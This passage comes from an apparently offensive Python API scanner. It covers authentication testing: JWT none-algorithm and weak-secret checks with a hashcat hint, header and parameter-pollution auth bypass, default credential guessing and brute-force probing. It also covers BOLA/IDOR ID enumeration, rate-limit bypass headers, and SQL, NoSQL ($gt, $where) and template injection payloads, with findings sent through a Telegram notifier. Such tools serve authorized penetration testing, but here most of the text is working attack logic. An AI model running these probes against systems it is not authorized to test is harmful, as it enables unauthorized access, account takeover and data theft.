    stats["spec_exposed"]    = len(spec_found)
    stats["spec_imported"]   = len(spec_endpoints)
    stats["graphql_intro"]   = graphql_found

    t = Table(title="Endpoint Discovery Summary", box=box.SIMPLE_HEAVY, title_style="bold cyan")
    t.add_column("Category", width=28)
    t.add_column("Count", justify="right", style="bold green")
    t.add_row("Spec files exposed (remote)", str(len(spec_found)))
    t.add_row("Spec endpoints imported",     f"[green]{len(spec_endpoints)}[/green]" if spec_endpoints else "0")
    t.add_row("Parsed from spec (methods)",  str(len(parsed_from_spec)))
    t.add_row("200 OK endpoints",            f"[green]{len(found_200)}[/green]")
    t.add_row("401 Auth required",           str(len(found_401)))
    t.add_row("403 Forbidden (try bypass)",  f"[yellow]{len(found_403)}[/yellow]")
    t.add_row("Spec-only (not fuzzed)",      str(spec_only_added))
    t.add_row("GraphQL introspection",       f"[{'red' if graphql_found else 'green'}]{'YES' if graphql_found else 'No'}[/]")
    t.add_row("[bold]Total in test queue[/bold]", f"[bold green]{len(live_paths)}[/bold green]")
    console.print(t)

    return live_paths

# PHASE 2 — AUTHENTICATION TESTING
async def phase_auth(base_url: str, D: OutputDirs, client: APIClient,
                      live_paths: List[Dict], tg: TelegramNotifier, stats: dict):
    pb(2, "AUTHENTICATION TESTING")

    auth_findings: List[Dict] = []
    auth_endpoints = [e for e in live_paths
                      if any(kw in e["path"].lower()
                             for kw in ["auth", "login", "token", "oauth", "session", "register"])]

    # JWT Analysis
    inf("JWT token analysis...")
    if client.headers.get("Authorization", "").startswith("Bearer "):
        token = client.headers["Authorization"][7:]
        parts = token.split(".")
        if len(parts) == 3:
            try:
                header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
                payload_b64= parts[1] + "=" * (4 - len(parts[1]) % 4)
                header  = json.loads(base64.urlsafe_b64decode(header_b64))
                payload = json.loads(base64.urlsafe_b64decode(payload_b64))

                (D.auth / "jwt_header.json").write_text(json.dumps(header, indent=2))
                (D.auth / "jwt_payload.json").write_text(json.dumps(payload, indent=2))

                alg = header.get("alg", "")
                ok(f"JWT Algorithm: {alg}")
                ok(f"JWT Subject: {payload.get('sub', 'N/A')}")
                ok(f"JWT Expires: {datetime.fromtimestamp(payload['exp']).isoformat() if 'exp' in payload else 'NO EXPIRY '}")

                if "exp" not in payload:
                    auth_findings.append({"type": "JWT No Expiry", "sev": "HIGH",
                                           "detail": "JWT token has no expiration claim"})
                    warn("JWT has NO expiration!")
                    tg.queue_finding("HIGH", "JWT No Expiry", "Token never expires")

                if alg.lower() in ["hs256", "hs384", "hs512"]:
                    inf("Testing weak JWT secrets...")
                    # Test common secrets (simulation — show what would be tested)
                    (D.auth / "jwt_weak_secrets.txt").write_text(
                        f"# Algorithm: {alg}\n# Token: {token[:50]}...\n"
                        f"# Test these secrets:\n" + "\n".join(WEAK_JWT_SECRETS))
                    ok(f"Weak secret wordlist saved ({len(WEAK_JWT_SECRETS)} secrets)")
                    ok("Use: hashcat -a 0 -m 16500 <token> wordlist.txt")

                if alg.lower() == "none" or alg == "":
                    auth_findings.append({"type": "JWT None Algorithm", "sev": "CRITICAL",
                                           "detail": "JWT uses 'none' algorithm — signature bypass!"})
                    crit("JWT none algorithm detected!")
                    tg.queue_finding("CRITICAL", "JWT None Algorithm",
                                           "Signature bypass possible")

            except Exception as ex:
                warn(f"JWT parse error: {ex}")

    # Auth bypass testing on protected endpoints
    # Only test endpoints that returned 401/403 WITHOUT our auth headers.
    # Confirm the 401/403 first without auth, then test bypass techniques.
    inf("Testing authentication bypass techniques...")
    protected = [e for e in live_paths if e["status"] in [401, 403]]

    bypass_results = []
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for ep in protected[:10]:
            # First confirm the endpoint is actually blocked without bypass headers
            try:
                async with s.get(ep["url"], headers=client.headers) as baseline_r:
                    baseline_status = baseline_r.status
                    baseline_body   = await baseline_r.text()
            except:
                continue
            # If baseline is already 200, bypass test is meaningless
            if baseline_status == 200:
                continue

            for bypass_hdr in AUTH_BYPASS_HEADERS:
                try:
                    hdrs = {**client.headers, **bypass_hdr}
                    async with s.get(ep["url"], headers=hdrs) as r:
                        bypass_body = await r.text()
                        # Must be 200 AND return meaningful content (not same error page)
                        if r.status == 200 and len(bypass_body) > 50:
                            # Make sure it's actually different from the blocked response
                            if bypass_body.strip() == baseline_body.strip():
                                continue  # same content = not a real bypass
                            detail = (
                                f"{ep['url']} — baseline {baseline_status} → "
                                f"bypassed to 200 with header: {list(bypass_hdr.keys())[0]}"
                            )
                            bypass_results.append(detail)
                            f = safe_finding({
                                "type":   "Authentication Bypass",
                                "sev":    "CRITICAL",
                                "url":    ep["url"],
                                "method": "GET",
                                "detail": detail,
                                "poc_body": None,
                            }, hdrs)
                            if f:
                                auth_findings.append(f)
                                crit(f"AUTH BYPASS: {detail}")
                                tg.queue_finding("CRITICAL","Authentication Bypass", detail)
                            break  # One bypass per endpoint is enough
                except: pass

    if bypass_results:
        (D.auth / "auth_bypass_results.txt").write_text("\n".join(bypass_results))

    # Param pollution bypass — only on genuinely protected endpoints
    inf("Testing parameter pollution auth bypass...")
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        seen_urls: set = set()
        for ep in [e for e in live_paths if e["status"] in [401,403]][:10]:
            for pp in PARAM_POLLUTION[:5]:
                test_url = ep["url"] + pp
                if test_url in seen_urls: continue
                seen_urls.add(test_url)
                try:
                    async with s.get(test_url, headers=client.headers) as r:
                        body = await r.text()
                        if r.status == 200 and len(body) > 50:
                            f = safe_finding({
                                "type":   "Param Pollution Auth Bypass",
                                "sev":    "HIGH",
                                "url":    test_url,
                                "method": "GET",
                                "detail": f"{ep['path']} — 401/403 → 200 via param pollution: {pp}",
                                "poc_body": None,
                            }, client.headers)
                            if f:
                                auth_findings.append(f)
                                warn(f"Param pollution bypass: {test_url}")
                except: pass

    # Default credentials testing
    inf("Testing default credentials on login endpoints...")
    login_endpoints = [e for e in live_paths
                       if any(kw in e["path"].lower() for kw in ["login", "auth/token", "signin"])]

    DEFAULT_CREDS = [
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("admin", "admin123"), ("test", "test"), ("user", "user"),
        ("admin", ""), ("root", "root"), ("admin", "changeme"),
        ("administrator", "administrator"),
    ]

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for ep in login_endpoints[:3]:
            for username, password in DEFAULT_CREDS[:5]:
                payloads = [
                    {"username": username, "password": password},
                    {"email": f"{username}@target.com", "password": password},
                    {"user": username, "pass": password},
                ]
                for payload in payloads[:1]:
                    try:
                        async with s.post(ep["url"],
                                           json=payload,
                                           headers=client.headers) as r:
                            body = await r.text()
                            # Confirm by checking for actual token structure in response
                            # not just the word "token" which appears in many error messages
                            token_in_body = False
                            try:
                                rdata = json.loads(body)
                                token_val = (rdata.get("access_token") or rdata.get("token")
                                             or rdata.get("jwt") or rdata.get("auth_token",""))
                                token_in_body = bool(token_val and len(str(token_val)) > 20)
                            except: pass
                            if r.status == 200 and token_in_body:
                                f = safe_finding({
                                    "type":   "Default Credentials",
                                    "sev":    "CRITICAL",
                                    "url":    ep["url"],
                                    "method": "POST",
                                    "detail": f"Login succeeded with {username}:{password} — token returned",
                                    "poc_body": payload,
                                }, client.headers)
                                if f:
                                    auth_findings.append(f)
                                    crit(f"DEFAULT CREDS: {username}:{password} on {ep['url']}")
                                    tg.queue_finding("CRITICAL","Default Credentials",
                                        f"{username}:{password} on {ep['url']}")
                    except: pass

    # Rate limit on login (brute-force protection check)
    inf("Checking brute-force protection on auth endpoints...")
    for ep in login_endpoints[:2]:
        statuses = []
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5),
                                          connector=aiohttp.TCPConnector(ssl=False)) as s:
            for i in range(10):
                try:
                    async with s.post(ep["url"],
                                       json={"username": "test", "password": f"wrong{i}"},
                                       headers=client.headers) as r:
                        statuses.append(r.status)
                except: pass

        all_200 = all(s in [200, 401, 400] for s in statuses)
        no_block = 429 not in statuses and 403 not in statuses
        if no_block and len(statuses) >= 5:
            auth_findings.append({
                "type": "No Brute Force Protection",
                "sev": "HIGH",
                "detail": f"{ep['url']} — no rate limit on login after 10 attempts. Statuses: {statuses}"
            })
            warn(f"No brute force protection: {ep['url']}")
            tg.queue_finding("HIGH", "No Brute Force Protection",
                                   f"10 login attempts unblocked at {ep['url']}")

    sjson(D.auth / "auth_findings.json", auth_findings)
    stats["auth_issues"] = len(auth_findings)
    ok(f"Auth testing: {len(auth_findings)} findings")
    return auth_findings

# PHASE 3 — BOLA / IDOR / AUTHORIZATION TESTING
async def phase_authz(base_url: str, D: OutputDirs, client: APIClient,
                       live_paths: List[Dict], tg: TelegramNotifier, stats: dict):
    pb(3, "BOLA · IDOR · AUTHORIZATION BYPASS")

    bola_findings: List[Dict] = []
    evidence_dir = D.bola / "evidence"
    evidence_dir.mkdir(exist_ok=True)

    RESOURCE_PATTERNS = [
        r'/api/v\d+/\w+/(\d+)',
        r'/api/\w+/(\d+)',
        r'/\w+/([0-9a-f-]{36})',
        r'/\w+/(\d+)(?:/|$)',
    ]

    def _is_uuid(val: str) -> bool:
        return bool(re.match(
            r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
            str(val).lower()
        ))

    def _alt_uuids(original: str) -> List[str]:
        """Generate plausible alternative UUIDs for cross-tenant BOLA testing."""
        # Increment last segment by 1 and 2
        parts = original.split("-")
        alts = []
        try:
            last = int(parts[-1], 16)
            for delta in [1, 2, -1, 0x100]:
                new_last = format((last + delta) % (16**12), "012x")
                alts.append("-".join(parts[:-1] + [new_last]))
        except: pass
        # Zero UUID — often returns global/admin data
        alts.append("00000000-0000-0000-0000-000000000001")
        alts.append("00000000-0000-0000-0000-000000000002")
        # Common test UUIDs
        alts.append("ffffffff-ffff-ffff-ffff-ffffffffffff")
        return [a for a in alts if a != original][:5]

    def _response_has_data(body: str, status: int) -> bool:
        """Return True if response looks like real data (not empty/error)."""
        if status not in [200, 201]: return False
        if len(body) < 10: return False
        lower = body.lower()
        if any(kw in lower for kw in ["not found","unauthorized","forbidden",
                                       "invalid","error","no result"]): return False
        return True

    def _content_differs(body_a: str, body_b: str) -> bool:
        """Return True if two responses contain meaningfully different data."""
        if not body_a or not body_b: return True  # one is empty = different
        # Normalize whitespace then compare
        norm_a = re.sub(r'\s+', ' ', body_a.strip())
        norm_b = re.sub(r'\s+', ' ', body_b.strip())
        if norm_a == norm_b: return False  # identical = same resource, not BOLA
        # Both have data but different content = potential BOLA
        return len(norm_b) > 20

    def _save_evidence(ep_path: str, param: str, orig_val: str, test_val: str,
                        orig_status: int, orig_body: str,
                        test_status: int, test_body: str,
                        method: str, test_url: str, hdrs: dict) -> Path:
        """Write raw evidence file for this BOLA test."""
        safe = re.sub(r'[^a-zA-Z0-9_-]', '_', f"{ep_path}_{param}_{test_val}")[:60]
        ev_file = evidence_dir / f"BOLA_{safe}.txt"
        hdr_str = "\n".join(f"{k}: {v}" for k, v in hdrs.items()
                              if k.lower() not in {"user-agent","accept-encoding"})
        ev_file.write_text(
            f"=== BOLA EVIDENCE ===\n"
            f"Endpoint : {ep_path}\n"
            f"Param    : {param}\n"
            f"Original : {orig_val} → HTTP {orig_status}\n"
            f"Test val : {test_val} → HTTP {test_status}\n"
            f"Method   : {method}\n"
            f"Test URL : {test_url}\n\n"
            f"=== REQUEST HEADERS ===\n{hdr_str}\n\n"
            f"=== ORIGINAL RESPONSE ({orig_status}) ===\n{orig_body[:2000]}\n\n"
            f"=== TEST RESPONSE ({test_status}) ===\n{test_body[:2000]}\n"
        )
        return ev_file

    # Spec-aware BOLA — primary path
    inf("Phase 3a: Spec-aware BOLA testing (all methods, all path params)...")
    spec_eps = [e for e in live_paths if e.get("path_params") and e.get("from_spec")]

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=12),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for ep in spec_eps:
            path        = ep.get("path", "")
            path_params = ep.get("path_params", [])
            examples    = ep.get("path_param_examples", {})
            methods     = [ep.get("method","GET")]
            # Also test GET on write endpoints — sometimes they're readable too
            if ep.get("method","GET") not in ["GET","HEAD"]:
                methods = ["GET"] + methods

            for param_name in path_params:
                original_val = str(examples.get(param_name, "1"))
                is_uuid_param = _is_uuid(original_val) or "id" in param_name.lower()

                # Build test ID list based on type
                if _is_uuid(original_val):
                    test_vals = _alt_uuids(original_val)
                elif original_val.isdigit():
                    base = int(original_val)
                    test_vals = [str(base+1), str(base+2), str(base-1),
                                  "0", "999999", "-1", "2147483647"]
                else:
                    # String-based ID — try prefix/suffix variations
                    test_vals = [original_val + "_test", "admin", "test",
                                  original_val[:-1] if len(original_val) > 1 else "x",
                                  "null", "undefined"]

                for method in methods:
                    # Fetch original response first for comparison
                    orig_url  = f"{base_url}{ep.get('example_path', path)}"
                    orig_body = ""
                    orig_status = 0
                    try:
                        async with s.request(method, orig_url,
                                              headers=client.headers) as orig_r:
                            orig_status = orig_r.status
                            orig_body   = await orig_r.text()
                    except: pass

                    for test_val in test_vals:
                        test_path = path.replace(f"{{{param_name}}}", str(test_val))
                        test_url  = f"{base_url}{test_path}"
                        try:
                            async with s.request(method, test_url,
                                                  headers=client.headers) as r:
                                test_body   = await r.text()
                                test_status = r.status

                                if not _response_has_data(test_body, test_status):
                                    continue

                                differs = _content_differs(orig_body, test_body)

                                if differs:
                                    confidence = "HIGH"
                                    sev        = "HIGH"
                                    detail_sfx = "different data returned — cross-resource access confirmed"
                                else:
                                    confidence = "MEDIUM"
                                    sev        = "MEDIUM"
                                    detail_sfx = "200 returned — verify if data belongs to different owner"

                                detail = (
                                    f"{method} {test_path} → HTTP {test_status} ({len(test_body)}b) | "
                                    f"param '{param_name}' changed from '{original_val}' to '{test_val}' | "
                                    f"{detail_sfx}"
                                )

                                ev_file = _save_evidence(
                                    path, param_name, original_val, test_val,
                                    orig_status, orig_body,
                                    test_status, test_body,
                                    method, test_url, client.headers
                                )

                                finding = enrich_finding({
                                    "type":         f"BOLA/IDOR — {param_name}",
                                    "sev":          sev,
                                    "url":          test_url,
                                    "method":       method,
                                    "original_url": orig_url,
                                    "param":        param_name,
                                    "original_val": original_val,
                                    "test_val":     str(test_val),
                                    "status":       test_status,
                                    "confidence":   confidence,
                                    "detail":       detail,
                                    "evidence_file":str(ev_file),
                                    "is_uuid":      is_uuid_param,
                                    "poc_body":     None,
                                }, client.headers)

                                bola_findings.append(finding)
                                sev_fn = crit if sev == "CRITICAL" else warn
                                sev_fn(f"[BOLA {confidence}] {method} {test_path} [{param_name}={test_val}] → {test_status}")
                                console.print(f"  [dim]PoC: {finding['poc_curl'][:120]}...[/dim]")
                                tg.queue_finding(sev, f"BOLA — {param_name}", detail)
                        except: pass

    # Regex-based BOLA fallback for non-spec endpoints
    inf("Phase 3b: Regex-based BOLA on discovered endpoints...")
    regex_eps = [e for e in live_paths if not e.get("from_spec")]
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for ep in regex_eps[:15]:
            path = ep.get("path","")
            for pat in RESOURCE_PATTERNS:
                m = re.search(pat, path)
                if not m: continue
                original_id = m.group(1)
                test_ids = _alt_uuids(original_id) if _is_uuid(original_id) else                            [str(int(original_id)+1), str(int(original_id)+2),
                            "0","99999"] if original_id.isdigit() else []
                for test_id in test_ids[:4]:
                    new_path  = path[:m.start(1)] + str(test_id) + path[m.end(1):]
                    test_url  = f"{base_url}{new_path}"
                    orig_url  = f"{base_url}{path}"
                    try:
                        async with s.get(orig_url, headers=client.headers) as orig_r:
                            orig_body = await orig_r.text() if orig_r.status == 200 else ""
                        async with s.get(test_url, headers=client.headers) as r:
                            test_body = await r.text()
                            if _response_has_data(test_body, r.status):
                                finding = enrich_finding({
                                    "type":       "BOLA/IDOR — regex",
                                    "sev":        "MEDIUM",
                                    "url":        test_url,
                                    "method":     "GET",
                                    "test_id":    str(test_id),
                                    "detail":     f"GET {new_path} → {r.status} ({len(test_body)}b) — regex-detected resource ID",
                                    "poc_body":   None,
                                }, client.headers)
                                bola_findings.append(finding)
                                warn(f"[BOLA regex] {new_path} → {r.status}")
                    except: pass
                break

    # Unauthenticated access check
    inf("Phase 3c: Unauthenticated access check...")
    priv_findings: List[Dict] = []
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for ep in [e for e in live_paths if e.get("status") == 200][:15]:
            try:
                no_auth_hdrs = {k:v for k,v in client.headers.items()
                                 if k.lower() != "authorization"}
                async with s.get(ep["url"], headers=no_auth_hdrs) as r_noauth:
                    body_noauth = await r_noauth.text()
                async with s.get(ep["url"], headers=client.headers) as r_auth:
                    body_auth = await r_auth.text()

                if r_noauth.status == 200 and len(body_noauth) > 50:
                    detail = (
                        f"No-auth → {r_noauth.status} ({len(body_noauth)}b) | "
                        f"Auth → {r_auth.status} ({len(body_auth)}b)"
                    )
                    finding = enrich_finding({
                        "type":   "Broken Authentication — Endpoint Accessible Without Auth",
                        "sev":    "HIGH",
                        "url":    ep["url"],
                        "method": "GET",
                        "detail": detail,
                        "poc_body": None,
                    }, no_auth_hdrs)
                    priv_findings.append(finding)
                    warn(f"No auth required: {ep['url']}")
                    tg.queue_finding("HIGH", "No Auth Required", detail)
            except: pass

    sjson(D.bola / "bola_findings.json", bola_findings)
    sjson(D.privesc / "priv_esc_findings.json", priv_findings)

    all_authz = bola_findings + priv_findings
    stats["bola_findings"] = len(bola_findings)
    ok(f"Authorization: {len(bola_findings)} BOLA candidates | {len(priv_findings)} auth bypass | evidence → {evidence_dir}")
    return all_authz

# PHASE 4 — RATE LIMITING & THROTTLING
async def phase_rate_limit(base_url: str, D: OutputDirs, client: APIClient,
                            live_paths: List[Dict], tg: TelegramNotifier, stats: dict):
    pb(4, "RATE LIMITING & THROTTLING TESTS")

    rl_findings: List[Dict] = []
    test_endpoints = [e for e in live_paths if e["status"] == 200][:5]

    if not test_endpoints:
        test_endpoints = live_paths[:3]

    RL_HEADERS = ["X-RateLimit-Limit","X-RateLimit-Remaining","X-RateLimit-Reset",
                  "Retry-After","X-Rate-Limit","RateLimit-Limit","RateLimit-Policy"]

    # ── Step 1: Confirm whether server enforces any rate limiting at all ──
    # Send 50 requests. If we get even one 429 the server has rate limiting.
    # Only report "No Rate Limiting" if we complete all 50 with zero throttling.
    inf("Probing rate limiting (50 rapid requests)...")
    rate_limited_eps: list = []
    unlimited_eps:    list = []

    for ep in test_endpoints[:3]:
        statuses = []
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30),
                                          connector=aiohttp.TCPConnector(ssl=False)) as s:
            tasks = [s.get(ep["url"], headers=client.headers) for _ in range(50)]
            for coro in asyncio.as_completed(tasks):
                try:
                    async with await coro as r:
                        statuses.append(r.status)
                except: pass

        got_429   = 429 in statuses
        got_block = any(s in [429,503,509] for s in statuses)
        ok(f"  {ep['path']}: {len(statuses)} sent — 429s: {statuses.count(429)}")

        if got_block:
            rate_limited_eps.append(ep)
            ok(f"  Rate limiting confirmed on {ep['path']}")
        else:
            unlimited_eps.append(ep)
            # Only report if we actually got all 50 responses (not errors)
            if len(statuses) >= 45:
                f = safe_finding({
                    "type":   "No Rate Limiting",
                    "sev":    "MEDIUM",
                    "url":    ep["url"],
                    "method": "GET",
                    "detail": f"50 rapid requests completed — 0 throttled (statuses: {sorted(set(statuses))})",
                    "poc_body": None,
                }, client.headers)
                if f:
                    rl_findings.append(f)
                    warn(f"No rate limiting: {ep['path']}")

    # Step 2: Rate limit bypass — only test if rate limiting EXISTS
    if rate_limited_eps:
        inf("Rate limiting found — testing bypass headers...")
        for ep in rate_limited_eps[:2]:
            for bypass_hdr in RATE_LIMIT_BYPASS_HEADERS[:8]:
                statuses = []
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15),
                                                  connector=aiohttp.TCPConnector(ssl=False)) as s:
                    for _ in range(30):
                        try:
                            async with s.get(ep["url"],
                                              headers={**client.headers, **bypass_hdr}) as r:
                                statuses.append(r.status)
                        except: pass
                if statuses.count(429) == 0 and len(statuses) >= 25:
                    hdr_name = list(bypass_hdr.keys())[0]
                    f = safe_finding({
                        "type":    "Rate Limit Bypass",
                        "sev":     "HIGH",
                        "url":     ep["url"],
                        "method":  "GET",
                        "detail":  f"30 requests with {hdr_name}: bypass confirmed — 0 throttled",
                        "poc_body": None,
                    }, {**client.headers, **bypass_hdr})
                    if f:
                        rl_findings.append(f)
                        warn(f"Rate limit bypass: {hdr_name} on {ep['path']}")
                        tg.queue_finding("HIGH","Rate Limit Bypass",
                            f"{hdr_name} bypasses rate limit on {ep['url']}")
    else:
        inf("No rate limiting found — skipping bypass tests (nothing to bypass)")

    # ── Step 3: Rate limit headers — report once per scan, not per endpoint
    inf("Checking rate limit response headers...")
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        ep = test_endpoints[0] if test_endpoints else None
        if ep:
            try:
                async with s.get(ep["url"], headers=client.headers) as r:
                    found = [h for h in RL_HEADERS
                              if h.lower() in {k.lower() for k in r.headers}]
                    if not found:
                        f = safe_finding({
                            "type":   "No Rate Limit Headers",
                            "sev":    "LOW",
                            "url":    ep["url"],
                            "method": "GET",
                            "detail": "No X-RateLimit-* or Retry-After headers in response",
                            "poc_body": None,
                        }, client.headers)
                        if f: rl_findings.append(f)
                    else:
                        ok(f"Rate limit headers present: {found}")
            except: pass

    sjson(D.ratelimit / "rate_limit_findings.json", rl_findings)
    stats["rate_limit_findings"] = len(rl_findings)
    ok(f"Rate limit testing: {len(rl_findings)} findings")
    return rl_findings

# PHASE 5 — INJECTION TESTING
async def phase_injection(base_url: str, D: OutputDirs, client: APIClient,
                           live_paths: List[Dict], tg: TelegramNotifier, stats: dict):
    pb(5, "INJECTION TESTING (SQLi · NoSQLi · SSTI · CMDi)")

    inj_findings: List[Dict] = []
    post_endpoints = [e for e in live_paths if e["status"] in [200, 201, 400, 422]][:10]

    # Parameter extraction — spec-first, then runtime fallback
    inf("Extracting parameters from spec + live endpoints...")
    # all_params: {url: {"fields": [...], "example_body": {...}, "method": "POST"}}
    all_params: Dict[str, Dict] = {}

    for ep in live_paths:
        body_fields = ep.get("body_fields", [])
        example_body = ep.get("example_body", {})
        query_params = ep.get("query_params", [])
        method = ep.get("method", "GET")

        if body_fields or query_params:
            all_params[ep["url"]] = {
                "fields":       body_fields,
                "example_body": example_body,
                "query_params": query_params,
                "method":       method,
            }

    # Runtime fallback — GET the endpoint and parse response keys
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for ep in post_endpoints[:10]:
            if ep["url"] in all_params:
                continue  # already have spec data
            try:
                async with s.get(ep["url"], headers=client.headers) as r:
                    body = await r.text()
                    try:
                        data = json.loads(body)
                        if isinstance(data, dict):
                            all_params[ep["url"]] = {
                                "fields": list(data.keys()),
                                "example_body": data,
                                "query_params": [],
                                "method": ep.get("method", "POST"),
                            }
                        elif isinstance(data, list) and data and isinstance(data[0], dict):
                            all_params[ep["url"]] = {
                                "fields": list(data[0].keys()),
                                "example_body": data[0],
                                "query_params": [],
                                "method": ep.get("method", "POST"),
                            }
                    except: pass
            except: pass
    inf(f"Targeting {len(all_params)} endpoints with known parameters")

    # SQL Injection
    inf(f"Testing SQL injection ({len(SQLI_PAYLOADS)} payloads)...")
    sqli_errors = [
        "sql syntax", "mysql_fetch", "pg_query", "ora-", "syntax error",
        "unclosed quotation", "quoted string not properly terminated",
        "sqlstate", "warning: mysql", "you have an error in your sql",
        "division by zero", "invalid query", "sql server", "mssql",
    ]

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for url, pinfo in list(all_params.items())[:8]:
            fields   = pinfo.get("fields", [])
            ex_body  = pinfo.get("example_body", {})
            ep_method= pinfo.get("method", "POST")
            for param in fields[:6]:
                for payload in SQLI_PAYLOADS[:8]:
                    # Build payload: inject into target field, keep others as examples
                    test_body = {**ex_body, param: payload}
                    # Use the spec-defined method; also try GET with query params
                    combos = [(ep_method, {"json": test_body})]
                    if pinfo.get("query_params"):
                        combos.append(("GET", {"params": {param: payload}}))
                    for method, kwargs in combos:
                        try:
                            async with s.request(method, url,
                                                  headers=client.headers, **kwargs) as r:
                                body = (await r.text()).lower()
                                for err_pat in sqli_errors:
                                    if err_pat in body:
                                        f = safe_finding({
                                            "type":    "SQL Injection",
                                            "sev":     "CRITICAL",
                                            "url":     url,
                                            "param":   param,
                                            "payload": payload,
                                            "method":  method,
                                            "detail":  f"Error pattern '{err_pat}' in response to payload: {payload!r} on param '{param}'",
                                            "evidence":err_pat,
                                            "poc_body":{**ex_body, param: payload},
                                        }, client.headers)
                                        if f:
                                            inj_findings.append(f)
                                            afile(D.sqli / "sqli_findings.txt",
                                                  f"[CRITICAL] {method} {url} param={param} payload={payload}")
                                            crit(f"SQLi: {url} param={param} — {err_pat}")
                                            tg.queue_finding("CRITICAL","SQL Injection",
                                                f"Param: {param} | Error: {err_pat} | URL: {url}")
                                        break
                        except: pass

    # ── NoSQL Injection — operator injection with auth bypass confirmation ──
    # False positive fix: "response bigger than negative" is too loose.
    # Instead: send operator payload AND a nonsense string, compare:
    #  - Operator returns 200 with data = possible bypass
    #  - Nonsense returns 401/404/empty = confirms baseline is gated
    #  - Also test {"$gt":""} on auth endpoints — classic NoSQL auth bypass
    inf("Testing NoSQL injection (operator injection + auth bypass)...")
    NOSQL_OPS = [
        {"$gt": ""},
        {"$ne": "invalid_xyz_9999"},
        {"$regex": ".*"},
        {"$where": "1==1"},
    ]
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for url, pinfo in list(all_params.items())[:8]:
            fields  = pinfo.get("fields", [])
            ex_body = pinfo.get("example_body", {})
            method  = pinfo.get("method","POST")
            for param in fields[:4]:
                # Get negative baseline: nonsense value should fail
                neg_body, neg_status = "", 0
                try:
                    async with s.request(method, url,
                                          json={**ex_body, param: "NOSQL_CANARY_XYZ_99999"},
                                          headers=client.headers) as r:
                        neg_status = r.status
                        neg_body   = await r.text()
                except: pass

                for op_payload in NOSQL_OPS:
                    try:
                        test_body_data = {**ex_body, param: op_payload}
                        async with s.request(method, url,
                                              json=test_body_data,
                                              headers=client.headers) as r:
                            body   = await r.text()
                            status = r.status
                            # Confirm: operator succeeds where nonsense fails
                            op_succeeds      = status in [200, 201] and len(body) > 50
                            baseline_failed  = neg_status not in [200, 201] or len(neg_body) < 30
                            bodies_differ    = body.strip() != neg_body.strip()
                            if op_succeeds and baseline_failed and bodies_differ:
                                f = safe_finding({
                                    "type":    "NoSQL Injection",
                                    "sev":     "CRITICAL",
                                    "url":     url,
                                    "method":  method,
                                    "param":   param,
                                    "payload": str(op_payload),
                                    "detail":  (
                                        f"Operator {op_payload} returned {status} ({len(body)}b) "
                                        f"while nonsense value returned {neg_status} ({len(neg_body)}b)"
                                    ),
                                    "poc_body": test_body_data,
                                }, client.headers)
                                if f:
                                    inj_findings.append(f)
                                    afile(D.nosqli / "nosqli_findings.txt",
                                          f"[CRITICAL] {url} param={param} op={op_payload}")
                                    crit(f"NoSQLi confirmed: {url} param={param}")
                                    tg.queue_finding("CRITICAL","NoSQL Injection",
                                        f"Operator bypass on param '{param}' at {url}")
                    except: pass

    # SSTI Testing — use math payloads with benign baseline
    # Classic false positive: "49" or "7777777" appearing in response for reasons
    # unrelated to template evaluation. Fix: send benign payload first, confirm
    # the MATH RESULT appears in test response but NOT in benign response.
    inf("Testing Server-Side Template Injection (with baseline comparison)...")
    # Each payload maps to its expected evaluated result
    SSTI_CONFIRMED = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("#{7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("{{7*'7'}}", "7777777"),  # Jinja2 specific
    ]
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for url, pinfo in list(all_params.items())[:8]:
            fields    = pinfo.get("fields", [])
            ex_body   = pinfo.get("example_body", {})
            ep_method = pinfo.get("method", "POST")
            for param in fields[:4]:
                # Get benign baseline first
                benign_body = ""
                try:
                    benign_payload = {**ex_body, param: "benigntest12345"}
                    kwargs = {"json": benign_payload} if ep_method != "GET"                               else {"params": {param: "benigntest12345"}}
                    async with s.request(ep_method, url,
                                          headers=client.headers, **kwargs) as r:
                        benign_body = await r.text()
                except: pass

                for ssti_payload, expected_result in SSTI_CONFIRMED:
                    try:
                        test_data = {**ex_body, param: ssti_payload}
                        kwargs = {"json": test_data} if ep_method != "GET"                                   else {"params": {param: ssti_payload}}
                        async with s.request(ep_method, url,
                                              headers=client.headers, **kwargs) as r:
                            body = await r.text()
                            # Only confirm if: expected result in test body
                            # AND expected result NOT in benign body
                            result_in_test    = expected_result in body
                            result_in_benign  = expected_result in benign_body
                            if result_in_test and not result_in_benign:
                                f = safe_finding({
                                    "type":    "Server-Side Template Injection (SSTI)",
                                    "sev":     "CRITICAL",
                                    "url":     url,
                                    "method":  ep_method,
                                    "param":   param,
                                    "payload": ssti_payload,
                                    "detail":  (
                                        f"Payload {ssti_payload!r} evaluated to {expected_result!r} "
